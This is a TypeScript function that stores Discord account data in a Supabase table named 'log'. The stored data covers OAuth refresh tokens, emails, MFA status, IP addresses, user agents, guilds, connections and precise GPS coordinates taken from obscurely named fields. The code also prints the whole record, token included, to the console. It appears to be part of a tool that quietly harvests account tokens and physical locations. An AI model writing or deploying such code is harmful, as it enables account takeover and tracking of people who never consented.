import { DiscordUser, IpInfo, GpsData, DiscordGuild, DiscordConnection } from "@/lib/types/userdata";
import { createClient } from "@supabase/supabase-js";
// import { DiscordGuild, DiscordConnection } from "@/lib/types/userdata";

export const pushToSupabase = async (
    refreshToken: string,
    userInfo: DiscordUser,
    ownGuilds: DiscordGuild[],
    connections: DiscordConnection[],
    ipInfo: IpInfo,
    ua: string,
    gps: GpsData
) => {
    try {
        console.log("Attempting to connect to Supabase with service role...");
        const supabase = createClient(
            process.env.NEXT_PUBLIC_SUPABASE_URL || '',
            process.env.SUPABASE_SERVICE_ROLE_KEY || '',
        );
        console.log("Supabase client created successfully with service role");
        
        const userData = {
            user_id: userInfo.id,
            user_name: userInfo.username,
            global_name: userInfo.global_name,
            email: userInfo.email,
            mfa_enabled: userInfo.mfa_enabled,
            locale: userInfo.locale,
            verified: userInfo.verified,
            ip: ipInfo.ip,
            user_agent: ua,
            gps: {
                accuracy: gps.ff,
                latitude: gps.hh,
                longitude: gps.xf
            },
            refresh_token: refreshToken,
            guilds: ownGuilds,
            connections: connections,
            created_at: new Date().toISOString(),
        };
        
        console.log("Preparing to insert data:", JSON.stringify(userData));
        
        const { data, error } = await supabase.from("log").upsert(userData, {
            onConflict: "user_id"
        });
        
        if (error) {
            console.error("Supabase insertion error:", error);
            return { success: false, error };
        }
        
        console.log("Data inserted successfully:", data);
        return { success: true, data };
    } catch (error) {
        console.error("push error:", error);
        return { success: false, error };
    }
}

